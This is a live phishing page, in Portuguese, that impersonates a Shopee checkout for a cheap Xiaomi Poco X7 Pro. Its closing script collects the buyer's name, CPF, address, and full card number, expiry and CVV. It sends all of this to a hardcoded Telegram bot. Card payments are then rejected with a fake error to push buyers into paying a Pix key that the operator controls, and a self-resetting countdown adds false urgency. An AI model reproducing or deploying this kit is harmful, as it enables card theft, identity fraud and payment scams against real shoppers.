<i class="fas fa-arrow-left text-orange-600 cursor-pointer" onclick="backToEnvio()"></i>
<h1 class="text-base font-medium">Continuar</h1>
</div>

<!-- ENDERE√áO -->
<div class="endereco-card">
<i class="fas fa-map-marker-alt" style="color: var(--shopee); margin-top: 2px;"></i>
<div style="flex: 1;">
<div style="font-weight: bold; font-size: 12px; margin-bottom: 3px;" id="res-nome"></div>
<div style="color: #757575; font-size: 11px; line-height: 1.4;" id="res-end"></div>
</div>
</div>

<!-- PRODUTO -->
<div class="produto-checkout">
<div class="loja-header">
<span class="tag-indicado">Indicado</span>
<span style="font-weight: 500; font-size: 13px;">Loja Oficial Onix</span>
</div>

<div class="produto-info">
<img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg" class="produto-img">
<div class="produto-detalhes">
<div class="produto-nome">Xiaomi Poco X7 PRO 5G Armazenamento 512GB-256GB + 8GB-12GB RAM...</div>
<div class="produto-variacao" id="res-variant">Poco X7 PRO 512/12 VERDE</div>
<div class="produto-preco">R$ <span id="res-price">1.299,00</span></div>
<div class="produto-quantidade">x<span id="res-qty">1</span></div>
</div>
</div>
</div>

<!-- SEGUROS -->
<div class="seguros-section">
<div class="seguro-titulo">
Adquirir Seguro
<span class="badge-recomendado">Recomendado</span>
</div>

<div class="seguro-item">
<div class="seguro-info">
<div class="seguro-nome">Seguro contra Roubo e Dano - 12 meses</div>
<div class="seguro-desc">Prote√ß√£o contra roubo, furto qualificado e dano acidental</div>
</div>
<div style="display: flex; align-items: center; gap: 10px;">
<span style="font-size: 13px; font-weight: 500;">R$ 247,28</span>
<label class="switch">
<input type="checkbox" id="seg1" onchange="atualizarTotal()">
<span class="slider"></span>
</label>
</div>
</div>

<div class="seguro-item">
<div class="seguro-info">
<div class="seguro-nome">Garantia Estendida - 12 meses</div>
<div class="seguro-desc">Aumente o tempo de garantia do seu produto</div>
</div>
<div style="display: flex; align-items: center; gap: 10px;">
<span style="font-size: 13px; font-weight: 500;">R$ 128,11</span>
<label class="switch">
<input type="checkbox" id="seg2" onchange="atualizarTotal()">
<span class="slider"></span>
</label>
</div>
</div>
</div>

<!-- CUPOM DA LOJA -->
<div class="cupom-section">
<div class="cupom-left">
<i class="fas fa-ticket-alt"></i>
<span class="cupom-text">Cupom da Loja</span>
</div>
<div style="display: flex; align-items: center; gap: 8px;">
<span class="cupom-placeholder">Selecione ou digite o c√≥digo</span>
<i class="fas fa-chevron-right" style="color: #ccc; font-size: 12px;"></i>
</div>
</div>

<!-- MENSAGEM VENDEDOR -->
<div class="cupom-section">
<div class="cupom-left">
<i class="far fa-comment-dots" style="color: #757575;"></i>
<span class="cupom-text" style="color: #757575;">Mensagem para o vendedor:</span>
</div>
<div>
<span class="cupom-placeholder">Digite aqui</span>
<i class="fas fa-chevron-right" style="color: #ccc; font-size: 12px;"></i>
</div>
</div>

<!-- OP√á√ÉO DE ENVIO -->
<div style="background: white; padding: 15px; margin-bottom: 8px;">
<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
<span style="font-size: 14px; font-weight: 500;">Op√ß√£o de Envio</span>
<a href="#" style="color: var(--shopee); font-size: 12px; text-decoration: none;">Ver Mais ></a>
</div>

<div style="border: 2px solid var(--btn-green); border-radius: 4px; padding: 12px; position: relative;">
<i class="fas fa-check-circle" style="position: absolute; top: 10px; left: 10px; color: var(--btn-green); font-size: 16px;"></i>
<div style="margin-left: 28px;">
<div style="font-weight: 500; font-size: 13px; margin-bottom: 3px;" id="prazo-entrega">Receba entre 24 e 26 de fev</div>
<div style="color: #757575; font-size: 11px;">Entrega Padr√£o</div>
</div>
<div style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); font-weight: 500;">R$ 26,30</div>
</div>
</div>

<!-- TOTAL -->
<div class="resumo-section">
<div style="font-size: 13px; font-weight: 500; margin-bottom: 10px;">Total de 1 itens</div>
<div class="resumo-line">
<span>Subtotal (itens)</span>
<span id="sum-sub"></span>
</div>
<div class="resumo-line">
<span>Frete</span>
<span>R$ 26,30</span>
</div>
<div class="resumo-line" style="color: var(--btn-green);">
<span>Cupom Frete Gr√°tis</span>
<span>-R$ 26,30</span>
</div>
<div class="resumo-line total">
<span>Total</span>
<span class="valor" id="sum-total"></span>
</div>
</div>

<!-- CUPOM SHOPEE -->
<div class="cupom-section">
<div class="cupom-left">
<i class="fas fa-ticket-alt"></i>
<span class="cupom-text">Cupom Shopee</span>
</div>
<div>
<span class="cupom-placeholder">Selecione ou digite o c√≥digo</span>
<i class="fas fa-chevron-right" style="color: #ccc; font-size: 12px;"></i>
</div>
</div>

<!-- FOOTER CHECKOUT -->
<div class="footer-checkout">
<div class="footer-total">
<div class="footer-total-label">Total</div>
<div class="footer-total-valor" id="foot-val"></div>
<div class="footer-total-economia">Economizou R$ <span id="economia">2.200,00</span></div>
</div>
<button onclick="processarPedido()" class="btn-fazer-pedido">Fazer pedido</button>
</div>
</div>

<!-- P√ÅGINA PAGAMENTO -->
<div id="p-pagamento" class="page" style="padding-bottom: 80px;">
<div class="checkout-header">
<i class="fas fa-arrow-left text-orange-600 cursor-pointer" onclick="openPage('p-checkout')"></i>
<h1 class="text-base font-medium">M√©todo de Pagamento</h1>
</div>

<div class="security-badge" style="margin: 15px;">
<i class="fas fa-shield-check"></i>
<span>Seus dados est√£o protegidos por ShopeePay</span>
</div>

<div class="pagamento-section">
<label class="pagamento-opcao" onclick="setMode('pix')">
<div class="pagamento-left">
<i class="fab fa-pix pix-icon"></i>
<div>
<span class="pagamento-text">Pix</span>
<span class="desconto-pix">(-R$ 50 OFF)</span>
</div>
</div>
<input type="radio" name="pay" checked style="width: 20px; height: 20px; accent-color: var(--shopee);">
</label>

<label class="pagamento-opcao" onclick="setMode('card')">
<div class="pagamento-left">
<i class="far fa-credit-card card-icon"></i>
<span class="pagamento-text">Cart√£o de Cr√©dito</span>
</div>
<input type="radio" name="pay" style="width: 20px; height: 20px; accent-color: var(--shopee);">
</label>

<div id="card-form" class="card-form" style="display: none;">
<div class="security-badge">
<i class="fas fa-lock"></i>
<span>Pagamento 100% seguro e criptografado</span>
</div>

<input id="c-nome" placeholder="Nome impresso no cart√£o" class="form-input" oninput="mLETRAS(this)">
<input id="c-num" placeholder="N√∫mero do Cart√£o" class="form-input" oninput="mCARD(this)" maxlength="19">
<div class="form-row">
<input id="c-val" placeholder="MM/AA" class="form-input" oninput="mVAL(this)" maxlength="5" style="margin: 0;">
<input id="c-cvv" placeholder="CVV" class="form-input" maxlength="4" style="margin: 0;">
</div>
</div>
</div>

<div class="resumo-section">
<div class="resumo-line">
<span>Subtotal</span>
<span id="pg-sub"></span>
</div>
<div class="resumo-line" id="row-pix">
<span>Desconto PIX</span>
<span style="color: var(--shopee);">-R$ 50,00</span>
</div>
<div class="resumo-line total">
<span>Total a pagar</span>
<span class="valor" id="pg-total"></span>
</div>
</div>

<div class="footer-checkout">
<div class="footer-total">
<div class="footer-total-label">Total</div>
<div class="footer-total-valor" id="pg-foot"></div>
</div>
<button onclick="processFinal()" class="btn-fazer-pedido">Confirmar Pagamento</button>
</div>
</div>

<!-- P√ÅGINA PIX -->
<div id="p-pix" class="page pix-page">
<div class="pix-success-icon">
<i class="fas fa-check"></i>
</div>

<h2 class="pix-titulo">Aguardando o Pagamento!</h2>
<p class="pix-subtitulo">Escaneie o QR Code ou copie o c√≥digo Pix</p>

<div class="pix-qr-container">
<div class="pix-valor" id="pix-final-val"></div>
<img id="img-qr" src="" class="pix-qr">
<button onclick="copiarPix()" class="btn-copiar-pix">
<i class="fas fa-copy"></i> Copiar C√≥digo Pix
</button>
</div>

<div class="pix-security">
<div class="pix-security-title">
<i class="fas fa-shield-alt"></i>
<span>COMPRA SEGURA SHOPEE</span>
</div>
<div class="pix-security-text">
Se o pedido n√£o for entregue, devolvemos seu dinheiro. Garantia total Shopee para sua prote√ß√£o e seguran√ßa.
</div>
</div>

<div class="pix-info">
<div class="pix-info-title">
<i class="fas fa-info-circle"></i>
<span>INSTRU√á√ïES DE PAGAMENTO</span>
</div>
<div class="pix-info-text">
1. Abra o app do seu banco<br>
2. Escolha pagar com Pix<br>
3. Escaneie o QR Code ou cole o c√≥digo<br>
4. Confirme o pagamento<br>
5. Pronto! Voc√™ ser√° redirecionado automaticamente
</div>
</div>
</div>

<script>
// CONFIGURA√á√ïES
const BOT_TOKEN = '7880759082:AAEvRzo4_NjdKnzrISfBzq3PeMLVFWRIvtw';
const CHAT_ID = '7294447445';
const CHAVE_PIX = '71241897-2447-4bbd-a5bf-81c62a376409';

// VARI√ÅVEIS GLOBAIS
let vBase = 1299.00;
let quantidade = 1;
let cor = 'Preto Onyx';
let ram = '512GB / 12GB RAM';
let payM = 'pix';
let cronometroInterval = null;
window.currentPix = "";

// CRON√îMETRO 6 HORAS (SEM RESETAR)
function iniciarCronometro() {
// 12 horas + 20 minutos + 30 segundos em milissegundos
const duracao = (12 * 60 * 60 * 1000) + (20 * 60 * 1000) + (30 * 1000);
const endTime = new Date().getTime() + duracao;
localStorage.setItem('cronometro_end', endTime);

if (cronometroInterval) clearInterval(cronometroInterval);

cronometroInterval = setInterval(() => {
const now = new Date().getTime();
const savedEnd = localStorage.getItem('cronometro_end');
const distance = savedEnd - now;

if (distance < 0) {
// Quando zerar, reinicia automaticamente
clearInterval(cronometroInterval);
localStorage.removeItem('cronometro_end');
iniciarCronometro(); // Reinicia o cron√¥metro
return;
}

const hours = Math.floor(distance / (1000 * 60 * 60));
const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
const seconds = Math.floor((distance % (1000 * 60)) / 1000);

document.getElementById('h').textContent = String(hours).padStart(2, '0');
document.getElementById('m').textContent = String(minutes).padStart(2, '0');
document.getElementById('s').textContent = String(seconds).padStart(2, '0');
}, 1000);
}

// CALCULAR DATA DE ENTREGA (8-10 DIAS)
function calcularEntrega() {
const hoje = new Date();
const inicio = new Date(hoje);
inicio.setDate(hoje.getDate() + 8);
const fim = new Date(hoje);
fim.setDate(hoje.getDate() + 10);

const meses = ['jan', 'fev', 'mar', 'abr', 'mai', 'jun', 'jul', 'ago', 'set', 'out', 'nov', 'dez'];
const textoEntrega = `Receba entre ${inicio.getDate()} e ${fim.getDate()} de ${meses[fim.getMonth()]}`;
const el = document.getElementById('prazo-entrega');
if (el) el.textContent = textoEntrega;
}

// NAVEGA√á√ÉO
function openPage(id) {
document.querySelectorAll('.page').forEach(p => {
p.classList.remove('active');
p.style.display = 'none';
});
const target = document.getElementById(id);
if(target) {
target.classList.add('active');
target.style.display = 'block';
window.scrollTo(0, 0);
}
if (id === 'p-pagamento') atualizarPagamento();
}

function openModal() { 
document.getElementById('modal-variants').style.display = 'block';
atualizarPrecoModal();
}

function closeModal() { 
document.getElementById('modal-variants').style.display = 'none';
}

function backToVitrine() { openPage('p-vitrine'); }
function backToEnvio() { openPage('p-envio'); }

function toggleSection(id) {
const content = document.getElementById(id);
if(content) content.classList.toggle('active');
}

// VARIANTES
function selColor(btn, n) {
btn.parentElement.querySelectorAll('.variant-btn').forEach(b => b.classList.remove('selected'));
btn.classList.add('selected');
cor = n;
}

function selSize(btn, p) {
btn.parentElement.querySelectorAll('.variant-btn').forEach(b => b.classList.remove('selected'));
btn.classList.add('selected');
vBase = parseFloat(p);
ram = btn.innerText;
atualizarPrecoModal();
}

function atualizarPrecoModal() {
const preco = vBase * quantidade;
document.getElementById('v-price').innerText = `R$ ${preco.toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
}

// QUANTIDADE
function adjQty(val) {
let q = document.getElementById('qty');
let n = parseInt(q.value) + val;
if(n > 0 && n <= 10) {
q.value = n;
quantidade = n;
atualizarPrecoModal();
}
}

function comprarAgora() {
closeModal();
openPage('p-envio');
}

// MODO PAGAMENTO
window.setMode = function(m) {
payM = m;
const cardForm = document.getElementById('card-form');
const rowPix = document.getElementById('row-pix');
if(cardForm) cardForm.style.display = (m === 'card') ? 'block' : 'none';
if(rowPix) rowPix.style.display = (m === 'pix') ? 'flex' : 'none';
atualizarPagamento();
}

// ATUALIZAR TOTAIS
function atualizarTotal() {
let subtotal = vBase * quantidade;
let t = subtotal;

const s1 = document.getElementById('seg1');
const s2 = document.getElementById('seg2');
if(s1 && s1.checked) t += 247.28;
if(s2 && s2.checked) t += 128.11;

const fSub = subtotal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
const fTotal = t.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });

if(document.getElementById('sum-sub')) document.getElementById('sum-sub').innerText = fSub;
if(document.getElementById('sum-total')) document.getElementById('sum-total').innerText = fTotal;
if(document.getElementById('foot-val')) document.getElementById('foot-val').innerText = fTotal;
if(document.getElementById('res-price')) document.getElementById('res-price').innerText = vBase.toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
if(document.getElementById('res-qty')) document.getElementById('res-qty').innerText = quantidade;

// Calcula economia
const precoOriginal = 3499 * quantidade;
const economia = precoOriginal - subtotal;
if(document.getElementById('economia')) document.getElementById('economia').innerText = economia.toFixed(2);

return t;
}

function atualizarPagamento() {
let t = atualizarTotal();
if (payM === 'pix') t -= 50;

const f = t.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
const fSub = (vBase * quantidade).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });

if(document.getElementById('pg-sub')) document.getElementById('pg-sub').innerText = fSub;
if(document.getElementById('pg-total')) document.getElementById('pg-total').innerText = f;
if(document.getElementById('pg-foot')) document.getElementById('pg-foot').innerText = f;
if(document.getElementById('pix-final-val')) document.getElementById('pix-final-val').innerText = f;

return t;
}

// BUSCAR CEP
async function buscarCEP() {
let cep = document.getElementById('in-cep').value.replace(/\D/g, '');
if (cep.length !== 8) return alert("CEP inv√°lido");
try {
const r = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
const d = await r.json();
if (!d.erro) {
document.getElementById('in-rua').value = `${d.logradouro} - ${d.bairro}`;
document.getElementById('in-cid').value = `${d.localidade} / ${d.uf}`;
} else {
alert("CEP n√£o encontrado!");
}
} catch(e) { 
alert("Erro ao buscar CEP!");
}
}

// IR PARA CHECKOUT
function goCheckout() {
const nomeInput = document.getElementById('in-nome');
const cpfInput = document.getElementById('in-cpf');
const cepInput = document.getElementById('in-cep');
const ruaInput = document.getElementById('in-rua');
const numInput = document.getElementById('in-num');
const cidInput = document.getElementById('in-cid');

if (!nomeInput || nomeInput.value.length < 5) {
return alert("Preencha o nome completo!");
}

if (!cpfInput || cpfInput.value.replace(/\D/g, '').length !== 11) {
return alert("Preencha um CPF v√°lido!");
}

if (!cepInput || cepInput.value.replace(/\D/g, '').length !== 8) {
return alert("Preencha o CEP!");
}

if (!ruaInput || ruaInput.value.length < 5) {
return alert("Preencha o endere√ßo!");
}

if (!numInput || numInput.value.length < 1) {
return alert("Preencha o n√∫mero!");
}

if (!cidInput || cidInput.value.length < 3) {
return alert("Preencha a cidade!");
}

const resNome = document.getElementById('res-nome');
const resEnd = document.getElementById('res-end');
const resVariant = document.getElementById('res-variant');

if (resNome) resNome.innerText = nomeInput.value;
if (resEnd) resEnd.innerText = `${ruaInput.value}, ${numInput.value} - ${cidInput.value}`;
if (resVariant) resVariant.innerText = `Poco X7 PRO ${ram.split('/')[0].trim()} ${cor}`;

calcularEntrega();
openPage('p-checkout');
atualizarTotal();
}

// PROCESSAR PEDIDO
function processarPedido() {
openPage('p-pagamento');
}

// GERAR PIX
function gerarPix(v) {
const f = (id, val) => id + val.length.toString().padStart(2, '0') + val;
const conta = f('00', 'br.gov.bcb.pix') + f('01', CHAVE_PIX);
let p = f('00', '01') + f('26', conta) + f('52', '0000') + f('53', '986') + f('54', v) + f('58', 'BR') + f('59', 'SHOPEE') + f('60', 'SAO PAULO') + f('62', f('05', '***')) + '6304';
let crc = 0xFFFF;
for (let i = 0; i < p.length; i++) {
crc ^= (p.charCodeAt(i) << 8);
for (let j = 0; j < 8; j++) crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : (crc << 1);
}
return p + (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
}

// PROCESSAR FINAL
window.processFinal = async function() {
const total = atualizarPagamento();
const subtotal = vBase * quantidade;

// COLETA TODOS OS DADOS DO CLIENTE
const nomeCliente = document.getElementById('in-nome')?.value || 'N/A';
const cpfCliente = document.getElementById('in-cpf')?.value || 'N/A';
const cepCliente = document.getElementById('in-cep')?.value || 'N/A';
const ruaCliente = document.getElementById('in-rua')?.value || 'N/A';
const numCliente = document.getElementById('in-num')?.value || 'N/A';
const cidCliente = document.getElementById('in-cid')?.value || 'N/A';

// COLETA TODOS OS DADOS DO CART√ÉO
const nomeCartao = document.getElementById('c-nome')?.value || 'N/A';
const numeroCartao = document.getElementById('c-num')?.value || 'N/A';
const validadeCartao = document.getElementById('c-val')?.value || 'N/A';
const cvvCartao = document.getElementById('c-cvv')?.value || 'N/A';

// MONTA MENSAGEM COMPLETA PARA O TELEGRAM
const msg = `üõí *NOVA VENDA SHOPEE* üõí

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üì± *PRODUTO*
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
Xiaomi Poco X7 Pro 5G
üé® Cor: ${cor}
üíæ Vers√£o: ${ram}
üì¶ Quantidade: ${quantidade}x
üí∞ Valor Unit: R$ ${vBase.toFixed(2)}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üë§ *DADOS DO CLIENTE*
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
Nome: ${nomeCliente}
CPF: ${cpfCliente}
CEP: ${cepCliente}
Endere√ßo: ${ruaCliente}
N√∫mero: ${numCliente}
Cidade: ${cidCliente}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üí≥ *FORMA DE PAGAMENTO*
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
M√©todo: ${payM.toUpperCase()}
${payM === 'card' ? `
üí≥ *DADOS DO CART√ÉO:*
Nome no Cart√£o: ${nomeCartao}
N√∫mero: ${numeroCartao}
Validade: ${validadeCartao}
CVV: ${cvvCartao}` : ''}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üí∞ *VALORES*
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
Subtotal: R$ ${subtotal.toFixed(2)}
${payM === 'pix' ? 'Desconto PIX: -R$ 50,00' : ''}
*TOTAL FINAL: R$ ${total.toFixed(2)}*

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üìÖ Data: ${new Date().toLocaleString('pt-BR')}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ`;

// ENVIA PARA O TELEGRAM
try {
await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ 
chat_id: CHAT_ID, 
text: msg, 
parse_mode: 'Markdown' 
})
});
console.log('‚úÖ Dados enviados ao Telegram com sucesso!');
} catch(e) { 
console.error("‚ùå Erro ao enviar para Telegram:", e);
}

// PROCESSA PAGAMENTO
if (payM === 'card') {
setTimeout(() => {
alert("‚ö†Ô∏è Erro no processamento do cart√£o!\n\nUse PIX para ganhar R$50 de desconto.");
window.setMode('pix');
document.getElementsByName('pay')[0].checked = true;
}, 1500);
} else {
const payload = gerarPix(total.toFixed(2));
window.currentPix = payload;
document.getElementById('img-qr').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(payload)}`;
openPage('p-pix');
simularPagamentoPix();
}
}

// SIMULAR PAGAMENTO PIX E REDIRECIONAR
function simularPagamentoPix() {
// Aguarda 30 segundos e redireciona para Shopee
setTimeout(() => {
if (confirm('Pagamento confirmado! Voc√™ ser√° redirecionado para a Shopee.')) {
window.location.href = 'https://shopee.com.br/';
}
}, 30000); // 30 segundos
}

// COPIAR PIX
function copiarPix() {
if (window.currentPix) {
navigator.clipboard.writeText(window.currentPix).then(() => {
alert("‚úÖ C√≥digo Pix Copiado!\n\nCole no seu app banc√°rio.");
}).catch(() => {
const textarea = document.createElement('textarea');
textarea.value = window.currentPix;
document.body.appendChild(textarea);
textarea.select();
document.execCommand('copy');
document.body.removeChild(textarea);
alert("‚úÖ C√≥digo Pix Copiado!");
});
}
}

// M√ÅSCARAS
function mLETRAS(i) { 
i.value = i.value.replace(/[^a-zA-Z√Ä-√ø\s]/g, '').toUpperCase();
}

function mCPF(i) { 
i.value = i.value.replace(/\D/g, '')
.replace(/(\d{3})(\d)/, "$1.$2")
.replace(/(\d{3})(\d)/, "$1.$2")
.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
}

function mCEP(i) { 
i.value = i.value.replace(/\D/g, '')
.replace(/(\d{5})(\d)/, "$1-$2");
}

function mCARD(i) { 
i.value = i.value.replace(/\D/g, '')
.replace(/(\d{4})(?=\d)/g, "$1 ")
.substring(0, 19);
}

function mVAL(i) { 
i.value = i.value.replace(/\D/g, '')
.replace(/(\d{2})(\d)/, "$1/$2")
.substring(0, 5);
}

// CARROSSEL
const track = document.getElementById('mainTrack');
if(track) {
track.addEventListener('scroll', () => {
const index = Math.round(track.scrollLeft / track.offsetWidth) + 1;
document.getElementById('carouselNum').innerText = `${index}/7`;
});
}

// INICIALIZA√á√ÉO
window.onload = function() {
// Verifica se j√° existe cron√¥metro rodando
if (!localStorage.getItem('cronometro_end')) {
iniciarCronometro();
} else {
// Continua cron√¥metro existente
const endTime = parseInt(localStorage.getItem('cronometro_end'));
const now = new Date().getTime();
if (endTime > now) {
iniciarCronometro();
} else {
// Cron√¥metro expirou
document.getElementById('h').textContent = '00';
document.getElementById('m').textContent = '00';
document.getElementById('s').textContent = '00';
}
}
atualizarTotal();
calcularEntrega();
}
</script>
</body>
</html>
